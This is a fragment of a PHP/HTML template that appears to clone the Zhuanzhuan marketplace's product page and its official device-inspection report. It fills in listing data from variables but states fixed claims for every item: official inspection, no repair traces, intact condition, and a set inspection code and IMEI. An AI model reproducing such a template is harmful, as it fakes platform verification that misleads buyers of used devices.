                               <p data-v-77d6a2c0=""><?php echo $oldnewb888;?></p>
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">购买渠道</p>
                               <p data-v-77d6a2c0=""><?php echo $_GoodsID['att_color']; ?></p>
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">保修情况</p>
                               <p data-v-77d6a2c0=""><?php echo $_GoodsID['bx']; ?></p>
                                  
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">维修痕迹</p>
                               <p data-v-77d6a2c0="">无私修痕迹</p>
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">电池健康值</p>
                               <p data-v-77d6a2c0=""><?php echo $_GoodsID['dc']; ?></p>
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">充电次数</p>
                               <p data-v-77d6a2c0=""><?php echo $_GoodsID['cd']; ?></p>
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">来源</p>
                               <p data-v-77d6a2c0="">二手优品</p>
                           </div>
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">IMEI</p>
                               <p data-v-77d6a2c0="">357*****646</p>
                           </div>
                       </div>
                       <!---->
                       <!---->
                       <!---->
                           <section zz-sectionid="106" data-v-11478e98="" data-v-77d6a2c0="">
                               <!---->
                           </section>
                       </div>
                   </section>





                    <!-- 无用代码开始 -->
                    <section zz-sectionid="109" class="promotion-wrapper" data-v-33ee2b72="">

                        <section zz-sectionid="106" data-v-11478e98="" data-v-33ee2b72="">
                            <!---->
                        </section>
                        <!-- 无用代码结束 -->
                        <div class="common-wrapper" data-v-33ee2b72="">
                            <div class="common-title" data-v-33ee2b72="">分期</div>
                            <div class="common-content" data-v-33ee2b72="">
                                <ul class="promotion-list" data-v-33ee2b72="">
                                    <!---->
                                    <li class="content-item" data-v-33ee2b72=""><span data-v-33ee2b72="">新户3期免息!￥1799/期!最高可分24期!</span>
                                        <div class="item-right" data-v-33ee2b72="" onclick="location.href='https://m.zhuanzhuan.com/common/loginsms/index.html?headTip=&amp;callbackUrl=https%3A%2F%2Fm.zhuanzhuan.com%2Fu%2Fzyservice%2Fdetail-yyj%3FinfoId%3D1442680054128313856%26metric%3DhxAwsSCb4hZWafbQjA1fWg192844xr%26searchFrom%3DminiGoodsDetail%26needHideShare%3D1%26needHideHead%3D3%26webview%3Dzzn%26__zpm%3D1%255EG1001%255E14%255E5%255E8%25E6%2588%2590%25E6%2596%25B0%2520%25E5%258D%258E%25E4%25B8%25BA%2520MateBook%252013%25202019%252013.0%25E8%258B%25B1%25E5%25AF%25B8%2520i5-8265U%25208GB%2520512G%2520SSD%2520NVIDIA%2520GeForce%2520MX250%2520%25E5%259B%25BD%25E8%25A1%258C%2520%25E6%25B7%25B1%25E7%25A9%25BA%25E7%2581%25B0%2520%25E5%258D%258E%25E4%25B8%25BA%2520%25E7%2594%25B5%25E8%2584%2591%2520%26tt%3D378E648D62AB5D376609CB2F03D79C721632802224896%26zzv%3D9.1.7%26isshare%3Dtrue%26shareuid%3D279588014408193280%26zzfrom%3DLinkCopy#/login';"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC" data-v-33ee2b72=""></div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <!---->
                        <div class="common-wrapper" data-v-33ee2b72="">
                            <div class="common-title" data-v-33ee2b72="">活动</div>
                            <div class="common-content" data-v-33ee2b72="">
                                <ul class="promotion-list" data-v-33ee2b72="">
                                    <!---->
                                    <li class="content-item" data-v-33ee2b72=""><span data-v-33ee2b72="">趣租机，iPhone 11 Pro Max信用免押，0元起租</span>
                                        <div class="item-right" data-v-33ee2b72="" onclick="location.href='https://m.zhuanzhuan.com/common/loginsms/index.html?headTip=&amp;callbackUrl=https%3A%2F%2Fm.zhuanzhuan.com%2Fu%2Fzyservice%2Fdetail-yyj%3FinfoId%3D1442680054128313856%26metric%3DhxAwsSCb4hZWafbQjA1fWg192844xr%26searchFrom%3DminiGoodsDetail%26needHideShare%3D1%26needHideHead%3D3%26webview%3Dzzn%26__zpm%3D1%255EG1001%255E14%255E5%255E8%25E6%2588%2590%25E6%2596%25B0%2520%25E5%258D%258E%25E4%25B8%25BA%2520MateBook%252013%25202019%252013.0%25E8%258B%25B1%25E5%25AF%25B8%2520i5-8265U%25208GB%2520512G%2520SSD%2520NVIDIA%2520GeForce%2520MX250%2520%25E5%259B%25BD%25E8%25A1%258C%2520%25E6%25B7%25B1%25E7%25A9%25BA%25E7%2581%25B0%2520%25E5%258D%258E%25E4%25B8%25BA%2520%25E7%2594%25B5%25E8%2584%2591%2520%26tt%3D378E648D62AB5D376609CB2F03D79C721632802224896%26zzv%3D9.1.7%26isshare%3Dtrue%26shareuid%3D279588014408193280%26zzfrom%3DLinkCopy#/login';"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC" data-v-33ee2b72=""></div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <!---->
                        <div class="common-wrapper" data-v-33ee2b72="">
                            <div class="common-title" data-v-33ee2b72="">流程</div>
                            <div class="common-content" data-v-33ee2b72="">
                                <div class="content-item process-item" data-v-33ee2b72="">
                                    <div data-v-33ee2b72="">
                                        <div zz-sectionid="103" zz-sortname="保卖寄存" zz-infoid="1441291861271413760" zz-url="https://m.zhuanzhuan.com/u/bmmain/help/quick-understand?type=Cplan&amp;couponId=1450001029486740553&amp;channel=BM_0104" data-areaexposure="103" data-isdot="0" class="baomai-router" data-v-33ee2b72="">
                                            <div class="seller-icon" data-v-33ee2b72="" data-src="https://thirdwx.qlogo.cn/mmopen/vi_32/6cr7uDiaEuj0G4OELgbHj7u1v7T7j6FF6T5bdD2Ua45KI7YhbyZ70hhsWzkxVoAVcuqvg29pF8EXt0kb5ylXibQw/132" lazy="loading" style="background-image: url(<?php echo $_GoodsID['goods_img1'] ?>);"></div>
                                            <?php echo $_GoodsID['user_name'];?>的宝贝已寄存在平台，下单24小时发货
                           </div>
                           <div class="process" data-v-33ee2b72=""><img src="img/process-order.e8d1cbc.png" data-v-33ee2b72=""></div>
                       </div>
                       <div class="item-right" data-v-33ee2b72=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC" data-v-33ee2b72=""></div>
                               </div>
                           </div>
                       </div>
                   </section>
                   <!---->
               </div>
               <!---->
               <!---->




               <style>
                   .zy-int {
                       background: #f8f8f8;
                       margin-top: 2.667vw;
                       margin-bottom: 2.667vw;
                       padding: 1.6vw 4.267vw 1.067vw;
                   }
               </style>
               <div class="zy-int"></div>
               <section data-v-422d6a4e="" class="qc-report" id="tab-qcreport">
                   <div data-v-422d6a4e="" class="report-wrap">
                       <div data-v-422d6a4e="" class="top-info">
                           <h4 data-v-422d6a4e="">验机评估报告</h4>
                           <div data-v-422d6a4e="" class="info-bottom">
                               <p data-v-422d6a4e="" class="left">转转官方验机 一机一验</p>
                               <!---->
                           </div>
                       </div>
                       <div data-v-422d6a4e="" class="box">
                           <div data-v-422d6a4e="" class="qc-info-wrap">
                               <div data-v-422d6a4e="" class="product-info">
                                   <p data-v-422d6a4e="" class="name">

                                       <?php echo $_GoodsID['title']; ?> </p>
                                   <div data-v-422d6a4e="" class="code">
                                       验机编码：351760927
                                       <div data-v-422d6a4e="" class="copy-btn"><span data-v-422d6a4e="">复制</span></div>
                                   </div>
                               </div>
                               <div data-v-422d6a4e="" class="qc-condition">
                                   <div data-v-422d6a4e="" class="condition-left">

                                       <!-- 等级渲染 -->


                                  <?php echo $oldnew888;?> </div>
                                   <div data-v-422d6a4e="" class="condition-right">
                                       <p data-v-422d6a4e="">
                                           等级<img data-v-422d6a4e="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAdVBMVEUAAACioqKxsbGkpKSZmZmbm5ubm5ugoKCampqampqampqampqbm5uampqZmZmampqZmZmampqZmZmZmZmZmZmampqampqZmZmbm5uampqampqZmZmampqampqampqbm5uZmZmampqcnJybm5udnZ2ampqZmZl5lL2WAAAAJnRSTlMACgMR5mZeGfd8x7tA8uySWdrMro/63rdSJk43O3CBPaTDMyEemoNUSnwAAAHkSURBVEjHlZbrkqMgEIUh4l2Md6O5zezMfu//iDsVK1Eg7JTnj1SDNKf70I1wIOdurMu+L+uxm6X4BUHUJmyQtFEg/JCpBrK0KiYpp6JKM0CnPjeHUEEexltbHOagwsO79XED2d213zNoYtd+Vgyn965PA+psG6OE3EsvyEkiaz0cD8KLwxEi4zwJV/FfXEnOG76Ko/gFR1T8ctiQW+eR31Nsmg45zdMSMgRmQj57QLcXg/lAuIykwojnV80T3dbLCbXkPCUzEqhAt7frsQaTWkb6cKUxXOfQfD1OdgNj6oIOHinIhWGlfKpthA9jr0cyWkIzfGtKChi2cyHtD+UEQ1kNTC86kBj0SKSYTcqiBPmKJChh0p5FR2qqKqpe4xk+jcmUToxUXsk1WLtVjKKm8MuH0pR8QS1KJs/+f6G3rtREKXrk+/UtJPYVlPTeHz5AF8L9wXekEMo/jnWi9JCWmtVukPaENYJxGdlhXRLnoGNVmJW4mewd5fVEljQW8bm+b7fvZWSLz5K3C0ve9gVy4V6gQHN32Q2Zm4U7OrCLwHrVqF3KpGuZseMN2iniKGkWshWBgu7naxcyf6kMqkIIt1TuLcZ7y/3uhrK/Ze1vim7bvbj2i9F29zb2/U+H/Y+T3c+ff7fyM0rxm6h8AAAAAElFTkSuQmCC">
                                       </p>
                                       <p data-v-422d6a4e="">外观完好，功能完好</p>
                                   </div> <img data-v-422d6a4e="" src="img/c4387d2a-c6f2-4586-b403-0849272e22a2.png" class="quality">
                               </div>
                               <div data-v-422d6a4e="" class="qc-info">
                       <div data-v-422d6a4e="" class="info">
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   <?php echo $oldnewb888;?>
                               </p>
                               <p data-v-422d6a4e="" class="key">
                                   网络制式
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   <?php echo $_GoodsID['att_color']; ?> </p>
                               <p data-v-422d6a4e="" class="key">
                                   购买渠道
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   <?php echo $_GoodsID['bx']; ?> </p>
                               <p data-v-422d6a4e="" class="key">
                                   保修情况
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   无私修痕迹
                               </p>
                               <p data-v-422d6a4e="" class="key">
                                   维修痕迹
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   <?php echo $_GoodsID['dc']; ?> </p>
                               <p data-v-422d6a4e="" class="key">
                                   电池健康值
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   <?php echo $_GoodsID['cd']; ?> </p>
                               <p data-v-422d6a4e="" class="key">
                                   充电次数
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   二手优品 </p>
                               <p data-v-422d6a4e="" class="key">
                                   来源
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   358***256 </p>
                               <p data-v-422d6a4e="" class="key">
                                   IMEI
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                           <div data-v-422d6a4e="" class="detail-item">
                               <p data-v-422d6a4e="" class="value">
                                   <?php echo $_GoodsID['pm']; ?>英寸 </p>
                               <p data-v-422d6a4e="" class="key">
                                   屏幕尺寸
                                   <span data-v-422d6a4e="" class="tips">
                                       <!---->
                                   </span>
                               </p>
                           </div>
                       </div>
                   </div>
                   <div data-v-422d6a4e="" class="qc-result">
                       <p data-v-422d6a4e="" class="title"><span data-v-422d6a4e="" class="tag">检测说明</span></p>
                       <p data-v-422d6a4e="" class="detail">
                           经检测：该机外观完好，功能完好，外观请参考真机实拍图，商品检测拆修情况目前仅针对部件有第三方拆修情况进行检测，对于厂家官方的维修因技术原因无法进行判断，检测结果详见验机报告。 外观请参考真机实拍图，同时转转提供7天无理由，一年官方质保服务
                       </p>
                   </div>
               </div>
               <div data-v-422d6a4e="" class="qc-report-detail">
                   <div data-v-6e9300e2="" data-v-422d6a4e="" class="qc-report-tab">
                       <div data-v-6e9300e2="" class="report-tab-tt"><span data-v-6e9300e2="" class="tt">外观检测</span>
                           <div data-v-6e9300e2="" class="con hideCheckedIcon">
                               <!---->
                               <div data-v-6e9300e2="" class="check-num normal"><img data-v-6e9300e2="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAASxQTFRFAAAAVf+qVeOOZuaZWuGHVdmEU9qGVdiGU9iFUteFUteFUtiEUtiEU9iDUtiEU9iEU9eEUteEUteEUtiEUteDU9iDU9eDUteDU9eDVNeEVdeFVteFVtiGWdiIXdmLYtqPZNuQZtuRZ9ySadyTa9yVbN2Vbt2Xb92Xb92YcN6Yc96adN+bdt+dd9+eeN+ee+CgfOChf+GjgeGlhOKnhuOoieOqi+Ssj+WukeWwlOaylua0mee2oOm6oum8puq/rOvDruzFsu3IuO7Muu/Nve/Qv/DRxfHVyPLY0PTd2fbj4Pfp4fjp4/jr5fns5/nu6vrw6/rw7Prx7vvy8Pv08fv18vz28/z29Pz39fz49v359/35+P36+f37+v37+v78+/78/P79/f7+/v7+////AK3cAAAAABd0Uk5TAAMJChEbN05cYGZ8j6+3y9vm7PL19/mS+y5dAAABpUlEQVRIx52Wd1uDMBDG00nZBAqpe++9t3XvWbVurfL9v4NBrBKSpsT3DzjC7x7I5e4SAOJKS5ph2Z5nW4YmpUETZWW9iCIq6nKWg2dUB1Fy1EwDPKVAxBRUUiw+Z6KGMnM0n4eII5iP8wUXceUWYjxqKsIj7zZ3cCN/lYMogeDvzFMmSiSzHl0FJZTys74wqQMM11xFiaV+55uT3MEJMlFGApKxg84l2nuIRx3XS5HHtxxWhon6SAOJ+4E9369ORAckoPH4bR9rPzqiAYPDbwb8UVt0yABWY34t4I87iDEL2LGo/JlLn5g/7STf28AjnnvPl+vm3DvmL7piX/VIh8FrvzYfmlPPmK/0IcqB+KUTDL1MB9boPTarI9S8bHLSQ3cYexhDqP8GG0+TdCCsWFjHHzF4O9B9iW9vs4zIGfGFm3nF6NUZvnwsskKtUamxUPNDrTLXRqKTbyXkN5g8Tj46vdcDfou9+DqzgMq+v8spIEaJ7hyUOCXKaAKlVl4TEG8zwo1MvFUKN2Pxdi++oYhvWeKbovi2K76xix8d/nE4SXL8+QKBmsD8vLm4GwAAAABJRU5ErkJggg=="> <span data-v-6e9300e2="">全部正常</span></div>
                               <!---->
                               <!----> <img data-v-6e9300e2="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="arrow">
                           </div>
                       </div>
                       <div data-v-6e9300e2="" class="content-wrap-show">
                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="condition-container">
                               <div data-v-422d6a4e="" data-v-6e9300e2="" class="example-pics-wrap">
                                   <ul data-v-422d6a4e="" data-v-6e9300e2="" class="example-pics">
                                       <li data-v-422d6a4e="" data-v-6e9300e2="" data-src="<?php echo $_GoodsID['goods_img1'] ?>" lazy="loaded" style="background-image: url(<?php echo $_GoodsID['goods_img1'] ?>);"></li>
                                       <li data-v-422d6a4e="" data-v-6e9300e2="" data-src="<?php echo $_GoodsID['goods_img2'] ?>" lazy="loaded" style="background-image: url(<?php echo $_GoodsID['goods_img2'] ?>);"></li>
                                       <li data-v-422d6a4e="" data-v-6e9300e2="" data-src="<?php echo $_GoodsID['goods_img3'] ?>" lazy="loaded" style="background-image: url(<?php echo $_GoodsID['goods_img3'] ?>);"></li>
                                       <li data-v-422d6a4e="" data-v-6e9300e2="" data-src="<?php echo $_GoodsID['goods_img4'] ?>" lazy="loaded" style="background-image: url(<?php echo $_GoodsID['goods_img4'] ?>);"></li>
                                       <li data-v-422d6a4e="" data-v-6e9300e2="" data-src="<?php echo $_GoodsID['goods_img5'] ?>" lazy="loaded" style="background-image: url(<?php echo $_GoodsID['goods_img5'] ?>);"></li>

                                   </ul>
                               </div>
                           </div>
                       </div>
                       <div data-v-6e9300e2="" class="content-wrap-toggle">
                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="grey-bg">
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">屏幕外观</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">屏幕划痕</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">屏幕碎裂</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">屏幕/其它</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">内屏掉漆</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>

                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">外壳划痕</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">磕碰</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">掉漆</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">印渍</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">缝隙</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">弯曲变形</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">外壳脱胶</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">壳内掉漆</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">其他外壳外观</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">外壳刻字/图</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">摄像头-外观</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">闪光灯</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">前置摄像头</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">后置摄像头</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">其它外观</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
